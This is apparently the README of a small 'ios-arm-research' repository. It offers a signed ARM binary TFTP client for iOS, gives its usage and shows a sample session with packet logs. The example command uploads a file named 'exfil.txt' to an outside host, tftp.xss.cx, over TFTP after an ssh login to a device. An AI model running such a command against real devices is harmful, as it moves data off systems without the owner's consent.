# ios-arm-research
iOS, ARM, Research

Updated Jan 25 2021

You read and you are here.. 

The file named 'client' is a Binary ARM file for TFTP Command Line on iOS and its signed with my Developer ID.

usage: ./client [-p port] [-h hostname] -f filename

Reminder: Its a TFTP CLI Executable, so you need a TFTP Server and a few other things to make it all work.. like a thingy...

Comment: the compiled file may be really helpful since you read the Post and now you probably want to ghost along to the same point..

none of that stuff was working and I just copy pasta the tftp client so could get that gzfile and see wtf is happening..

Putting it all together.. 
you'll be ssh into /dev/thingy

./client -h tftp.xss.cx -p 69 -f exfil.txt

...
...
Packet '143966' sent
Packet '143967' sent
Packet '143968' sent
Packet '143969' sent
FIN '143970' sent
Goodbye




